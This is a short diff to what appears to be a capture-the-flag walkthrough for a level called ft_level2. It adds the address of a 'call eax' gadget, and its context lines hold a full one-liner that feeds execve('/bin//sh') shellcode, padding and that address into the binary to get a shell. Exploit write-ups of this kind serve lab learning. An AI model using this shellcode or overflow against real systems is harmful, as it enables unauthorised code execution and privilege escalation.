@@ -201,6 +201,8 @@ here is a convenient one-liner:
 
 # As user level2:
 
+    # call eax is at address 0x080484ef
+
     # Run the program
     (python -c "print('\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80' + 54 * 'A' + '\x08\x04\x84\xef'[::-1])"; cat) | /home/user/level3/ft_level2
 
